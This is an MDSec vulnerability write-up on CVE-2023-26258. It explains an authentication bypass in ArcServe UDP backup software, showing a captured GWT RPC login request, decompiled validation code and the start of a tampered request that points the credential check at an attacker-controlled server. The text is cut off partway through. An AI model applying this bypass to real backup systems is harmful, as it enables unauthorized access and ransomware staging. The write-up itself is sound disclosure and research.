---
title: CVE-2023-26258 – Remote Code Execution in ArcServe UDP Backup
url: https://www.mdsec.co.uk/2023/06/cve-2023-26258-remote-code-execution-in-arcserve-udp-backup/
source: Penetration testing Archives - MDSec
date: 2023-06-29
fetch_date: 2025-10-04T11:50:40.673044
---

# CVE-2023-26258 – Remote Code Execution in ArcServe UDP Backup

* Our Services
* Knowledge Centre
* [About](https://www.mdsec.co.uk/about/)
* [Contact](https://www.mdsec.co.uk/contact/)

* Our Services
  + [Adversary Simulation](https://www.mdsec.co.uk/our-services/adversary-simulation/)
  + [Application Security](https://www.mdsec.co.uk/our-services/application-security/)
  + [Penetration Testing](https://www.mdsec.co.uk/our-services/penetration-testing/)
  + [Response](https://www.mdsec.co.uk/our-services/response/)
* Knowledge Centre
  + [Insights](https://www.mdsec.co.uk/knowledge-centre/insights/)
  + [Research](https://www.mdsec.co.uk/knowledge-centre/research/)
  + [Training](https://www.mdsec.co.uk/knowledge-centre/training/)
* [About](https://www.mdsec.co.uk/about/)
* [Contact](https://www.mdsec.co.uk/contact/)

* [![Adversary](https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-adversary.svg)

  ## Adversary Simulation

  Our best in class red team can deliver a holistic cyber attack simulation to provide a true evaluation of your organisation’s cyber resilience.](https://www.mdsec.co.uk/our-services/adversary-simulation/)
* [![Application Security](https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-application-security.svg)

  ## Application Security

  Leverage the team behind the industry-leading Web Application and Mobile Hacker’s Handbook series.](https://www.mdsec.co.uk/our-services/applicaton-security/)
* [![Penetration Testing](https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-penetration-testing.svg)

  ## Penetration Testing

  MDSec’s penetration testing team is trusted by companies from the world’s leading technology firms to global financial institutions.](https://www.mdsec.co.uk/our-services/penetration-testing/)
* [![Response](https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-response.svg)

  ## Response

  Our certified team work with customers at all stages of the Incident Response lifecycle through our range of proactive and reactive services.](https://www.mdsec.co.uk/our-services/response/)

* [## Research

  MDSec’s dedicated research team periodically releases white papers, blog posts, and tooling.](https://www.mdsec.co.uk/knowledge-centre/research/)
* [## Training

  MDSec’s training courses are informed by our security consultancy and research functions, ensuring you benefit from the latest and most applicable trends in the field.](https://www.mdsec.co.uk/knowledge-centre/training/)
* [## Insights

  View insights from MDSec’s consultancy and research teams.](https://www.mdsec.co.uk/knowledge-centre/insights/)

ActiveBreach

# CVE-2023-26258 – Remote Code Execution in ArcServe UDP Backup

[Home](https://www.mdsec.co.uk/) >
[Knowledge Centre](https://www.mdsec.co.uk/knowledge-centre/) >
[Insights](https://www.mdsec.co.uk/knowledge-centre/insights) >
CVE-2023-26258 – Remote Code Execution in ArcServe UDP Backup

## Overview

During a recent adversary simulation, the MDSec ActiveBreach red team were performing a ransomware scenario, with a key objective set on compromising the organisation’s backup infrastructure.

As part of this simulation, [Juan Manuel Fernandez](https://twitter.com/TheXC3LL) and Sean Doherty carried out a detailed analysis of the software used to perform backups ([ArcServe UDP](https://www.arcserve.com/uk/products/arcserve-udp)). Within minutes of analysing the code, a critical authentication bypass was discovered that allowed access to the administration interface.

In this article we will proceed to explain the root cause of this vulnerability that affects versions 7.0 to 9.0, as well as other interesting tradecraft that may be of interest to both defenders and offensive professionals.

## Authentication Bypass

When analysing the flow of HTTP requests made between our web browser and the web interface used for administrative tasks, we can observe that during the login process one of the requests sent is the following:

```
POST /contents/service/login HTTP/1.1
Host: 192.168.56.10:8014
Cookie: AGENTJSESSIONID=A20902BCB1FBFE1EEF99B4788DC24362
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/x-gwt-rpc; charset=utf-8
X-Gwt-Permutation: 69C1E1E0891DA29292A9BA76888D3D04
X-Gwt-Module-Base: <https://192.168.56.10:8014/contents/>
Content-Length: 245
Origin: <https://192.168.56.10:8014>
Referer: <https://192.168.56.10:8014/>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

7|0|10|https://192.168.56.10:8014/contents/|9D583B6834A20CE6C6975A0AA976C843|com.ca.arcflash.ui.client.login.LoginService|validateUser|java.lang.String/2004016611|I|https:|EPIPELAGIC|SEVENKINGDOMS|vagrant|adepts|1|2|3|4|6|5|5|6|5|5|5|7|8|8014|9|10|11|
```

We can see it sends a body using a serialised object via GWT RPC. It invokes the method `validateUser` and it receives as arguments, the schema (`https:`), server hostname (`EPIPELAGIC`), the domain (`SEVENKINGDOMS`), username (`vagrant`) and password (`adepts`).

This functionality can be found implemented at `flash-webui.jar` file:

```
public Boolean validateUser(HttpServletRequest req, String protocol, String host, int port, String domain, String username, String password, String logindetail) throws BusinessLogicException, ServiceConnectException, ServiceInternalException {
    logger.debug("validateUser(HttpServletRequest, String, String, int, String, String, String, String) - start");
    if (StringUtil.isEmptyOrNull(username))
      throw generateException(FlashServiceErrorCode.Login_UsernameRequired);
    if (StringUtil.isEmptyOrNull(password))
      throw generateException(FlashServiceErrorCode.Login_PasswordRequired);
    HttpSession session = req.getSession();
    WebServiceClientProxy client = null;
    LoginDetail detail = null;
    try {
      logger.debug(protocol + host + port);
      client = (WebServiceClientProxy)ServiceProviders.getLocalFlashServiceProvider().create(protocol, host, port, "IFlashService_R16_5");
      setServiceClient(req, client);
      detail = client.getService().validateUserWithDetail(username, password, domain, logindetail);
      setLocalWebServiceClient(client);
    } catch (WebServiceException exception) {
      logger.error("Error occurs during validate user...");
      logger.error(exception.getMessage());
      if (exception.getCause() instanceof Error && exception.getMessage().startsWith("Undefined operation name"))
        throw generateException(FlashServiceErrorCode.EDGE_D2D_INTERFACE_MISMATCH);
      proccessAxisFaultException(exception);
    }
    HostInfo hostInfo = new HostInfo();
    hostInfo.setName(host);
    hostInfo.setUsername(username);
    session.setAttribute(SessionConstants.SRING_DOMAIN, domain);
    session.setAttribute(SessionConstants.SRING_USERNAME, username);
    session.setAttribute(SessionConstants.SRING_PASSWORD, password);
    session.setAttribute(SessionConstants.SRING_UUID, "");
    session.setAttribute(SessionConstants.SRING_LOGIN_DETAIL, detail);
    logger.debug("validateUser(HttpServletRequest, String, String, int, String, String, String, String) - end");
    return Boolean.TRUE;
  }
```

As can be seen in the code above, the *validateUser* method creates a “client” that will act as a proxy to communicate independently with a WebService that will be in charge of the validation of the supplied credentials. The location of this WebService, along with the schema used (HTTP or HTTPs), is information that is supplied in the serialised object. Therefore, if we block and edit the request in transit to modify the values of the serialised object, we can make that “client” contact an HTTP server controlled by us. For example, let’s change “EPIPELAGIC” host to “192.168.56.1” and standup a minimal HTTP server to log the request:

```
7|0|10|https://192.168.56.10:8014/contents/|9D583B6834A20CE6C6975A0AA976C843|com.ca.arcflash.ui.client.login.Lo...